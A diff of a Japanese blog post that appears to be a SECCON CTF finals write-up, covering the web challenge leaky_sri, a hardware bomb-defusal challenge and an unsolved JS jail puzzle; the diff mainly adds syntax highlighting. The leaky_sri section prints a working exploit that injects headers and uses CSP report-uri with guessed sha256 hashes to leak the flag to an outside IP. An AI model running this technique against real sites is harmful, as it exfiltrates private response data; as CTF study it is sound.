@@ -61,29 +61,29 @@ XSSでなくともresponse bodyのXS-Leakができればいい。</p><p>まず�
 今回の環境ではブラウザから見てwebサーバがprivate IP addressにあるので、secure contextにないクライアントからはwebサーバのリソースにアクセスできない。
 secure contextにいたらいたで、webサーバがhttpなのでmixed contentで怒られる。詰み。</p><pre tabindex=0><code>The request client is not a secure context and the resource is in more-private address space `private`.
 </code></pre><p>Response Splittingも試したがうまくいかない。
-<code>Content-Security-Policy-Report-Only</code>を設定して、HTMLの先頭に <code>&lt;img src=http://exmaple.com/</code> を突っ込み、URLがレポートされないか試したりもしたが、ちゃんとタグが閉じられないとダメ。</p><p>色々試しているうちに、そういえばresponse bodyのXS-Leakだから、response bodyのhashがわかればいいんだよなと気づく。</p><p><code>Content-Security-Policy-Report-Only: style-src 'sha256-xxxx...'</code>を設定して、HTMLの先頭に <code>&lt;style></code> を突っ込めば<code>&lt;style></code>の中身がそのsha256にマッチするかどうかでleakできる。</p><pre tabindex=0><code>&lt;script&gt;
-const sleep = (time) =&gt; new Promise(res =&gt; setTimeout(res, time));
-const main = async () =&gt; {
-&lt;?php
-//$prefix = &#34;leaky_sr&#34;;
-$prefix = $_GET[&#34;prefix&#34;];
-$chars = &#34;._-}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;;
-file_put_contents(&#34;chars.txt&#34;, $chars);
-foreach (str_split($chars) as $char) {
-  $flag = &#34;Status: 200 OK\nContent-Type: text/plain; charset=utf-8\n\nSECCON{&#34; . $prefix . $char;
-  $length = 74 + strlen($prefix);
-  $hash = base64_encode(hash(&#39;sha256&#39;, $flag, true));
-  $q = &#34;Content-Type: text/html\r\nContent-Security-Policy-Report-Only: style-src &#39;sha256-$hash&#39;; report-uri http://35.194.96.69:12345/record.php?k=$char\r\nContent-Length: $length\r\n\r\n&lt;style&gt;&#34;;
-?&gt;
-a = window.open(&#39;http://web:3000/?q=&lt;?php echo urlencode($q) ?&gt;&#39;, &#39;&#39;, &#39;width=100,height=100&#39;);
-await sleep(100);
-a.close()
-&lt;?php } ?&gt;
-location = &#34;/redirect.php?prefix=&lt;?php echo $prefix; ?&gt;&#34;;
-}
-main();
-&lt;/script&gt;
-</code></pre><p>FLAG: <code>SECCON{leaky_sri}</code></p><h2 id=misc-digicake>Misc digicake</h2><p>1チーム20分が与えられ、順番に部屋に案内されるのでその間に解くやつ。</p><p>電気回路の基盤を渡されて、配線をゴリゴリ削りながら爆弾を解除する問題。</p><p>自分のチームはコンテスト開始から2時間後くらいの枠でチャレンジすることになっていたのだけど、チームで1番詳しそうな人が電工二種の試験でその時間は不在だし試験中なので当然連絡取れない。
+<code>Content-Security-Policy-Report-Only</code>を設定して、HTMLの先頭に <code>&lt;img src=http://exmaple.com/</code> を突っ込み、URLがレポートされないか試したりもしたが、ちゃんとタグが閉じられないとダメ。</p><p>色々試しているうちに、そういえばresponse bodyのXS-Leakだから、response bodyのhashがわかればいいんだよなと気づく。</p><p><code>Content-Security-Policy-Report-Only: style-src 'sha256-xxxx...'</code>を設定して、HTMLの先頭に <code>&lt;style></code> を突っ込めば<code>&lt;style></code>の中身がそのsha256にマッチするかどうかでleakできる。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sleep</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>time</span>) =&gt; <span style=color:#66d9ef>new</span> Promise(<span style=color:#a6e22e>res</span> =&gt; <span style=color:#a6e22e>setTimeout</span>(<span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>time</span>));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>main</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> () =&gt; {
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//$prefix = &#34;leaky_sr&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>$prefix</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$_GET</span>[<span style=color:#e6db74>&#34;prefix&#34;</span>];
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$chars</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;._-}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#a6e22e>file_put_contents</span>(<span style=color:#e6db74>&#34;chars.txt&#34;</span>, <span style=color:#a6e22e>$chars</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foreach</span> (<span style=color:#a6e22e>str_split</span>(<span style=color:#a6e22e>$chars</span>) <span style=color:#a6e22e>as</span> <span style=color:#a6e22e>$char</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>$flag</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Status: 200 OK\nContent-Type: text/plain; charset=utf-8\n\nSECCON{&#34;</span> . <span style=color:#a6e22e>$prefix</span> . <span style=color:#a6e22e>$char</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>$length</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>74</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#a6e22e>$prefix</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>$hash</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, <span style=color:#a6e22e>$flag</span>, <span style=color:#66d9ef>true</span>));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>$q</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Content-Type: text/html\r\nContent-Security-Policy-Report-Only: style-src &#39;sha256-$hash&#39;; report-uri http://35.194.96.69:12345/record.php?k=$char\r\nContent-Length: $length\r\n\r\n&lt;style&gt;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#f92672>?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> window.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;http://web:3000/?q=&lt;?php echo urlencode($q) ?&gt;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#e6db74>&#39;width=100,height=100&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>100</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>close</span>()
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> } <span style=color:#f92672>?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/redirect.php?prefix=&lt;?php echo $prefix; ?&gt;&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#a6e22e>main</span>();
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;
+</span></span></code></pre></div><p>FLAG: <code>SECCON{leaky_sri}</code></p><h2 id=misc-digicake>Misc digicake</h2><p>1チーム20分が与えられ、順番に部屋に案内されるのでその間に解くやつ。</p><p>電気回路の基盤を渡されて、配線をゴリゴリ削りながら爆弾を解除する問題。</p><p>自分のチームはコンテスト開始から2時間後くらいの枠でチャレンジすることになっていたのだけど、チームで1番詳しそうな人が電工二種の試験でその時間は不在だし試験中なので当然連絡取れない。
 そんな偶然ある？</p><p>大学とか高校の知識を思い出したりしながら、メンバー全員で取り組んだ。
 グラウンドにつながる配線切ればいいんじゃない？というアイデアを出したりして、少しは貢献できた気がする。</p><p>全チームでFirst blood。まあ最初のほうの枠だったので。</p><p>楽しかった。</p><p>FLAG: SECCON{How_many_solutions_did_you_find?}</p><h2 id=misc-whitespacejs>Misc whitespace.js</h2><p>JSパズル問なのに解けなかった&mldr;くやし〜</p><p>予選で出たnode-ppjailの延長だと思い、node.jsのソースコードからいい感じのガジェットがないかな〜とsemgrepかけたりソースコード見ながらdebuggerでポチポチしたりしていたら頭がおかしくなってタイムアップ。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>b</span>[<span style=color:#e6db74>&#34;polluted1&#34;</span>]
 </span></span><span style=display:flex><span><span style=color:#a6e22e>a</span>(<span style=color:#a6e22e>polluted2</span>)()
